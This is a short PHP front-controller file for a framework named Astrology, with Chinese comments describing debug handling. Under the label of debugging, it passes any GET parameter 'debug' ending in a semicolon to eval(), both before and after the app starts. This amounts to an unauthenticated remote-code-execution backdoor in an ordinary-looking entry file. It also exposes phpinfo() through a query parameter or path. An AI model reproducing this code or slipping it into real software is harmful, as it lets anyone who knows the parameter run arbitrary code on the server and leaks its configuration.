<?php
$DEBUG_INPUT = null;
# print_r($_GET);exit;
// 错误报告
if (isset($_GET['debug'])) {
    ini_set('display_errors', 1);
	ini_set('display_startup_errors', 1);
    error_reporting(E_ALL);
	
	$DEBUG_INPUT = $_GET['debug'];
	if (is_array($DEBUG_INPUT)) {
		if (isset($DEBUG_INPUT[0]) && preg_match('/;$/', $DEBUG_INPUT[0])) {
			eval($DEBUG_INPUT[0]);
		} else {
		}
		if (isset($DEBUG_INPUT[1])) {
			$DEBUG_INPUT = $DEBUG_INPUT[1];
		} else {
			$DEBUG_INPUT = $DEBUG_INPUT[0];
		}
	}
}

// 调试信息
if (isset($_GET['phpinfo']) || (isset($_SERVER['PATH_INFO']) && '/phpinfo' == $_SERVER['PATH_INFO']) ) {
	phpinfo();
	exit;
}


# require __DIR__ . '/../src/function.php';

/* 启动 Astrology */
require_once __DIR__ . '/../app/bootstrap.php';
new Astrology\Start();


// 调试问题
if (!empty($DEBUG_INPUT)) {
	if (preg_match('/;$/', $DEBUG_INPUT)) {
		eval($DEBUG_INPUT);# 
	}
}
